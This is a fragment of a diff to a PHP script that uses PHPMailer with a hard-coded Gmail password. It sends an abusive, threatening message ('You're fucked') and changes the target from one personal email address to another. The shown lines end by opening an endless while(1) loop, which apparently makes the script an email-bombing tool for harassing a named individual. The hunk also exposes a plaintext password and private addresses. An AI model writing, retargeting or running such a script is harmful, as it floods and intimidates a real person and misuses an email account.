@@ -12,7 +12,7 @@ $mail->Password   = "PPSSUXHARD";            // GMAIL password
 $mail->SetFrom('you@win.com', 'You win lol');
 $mail->Subject    = "So you think you can fuck with me?";
 $mail->Body = "55 minutes late lol...";
-$address = "bobivild@abv.bg";
+$address = "marria.alexandrrova@gmail.com";
 $mail->AddAddress($address, "You're fucked");
 
 while(1) { 
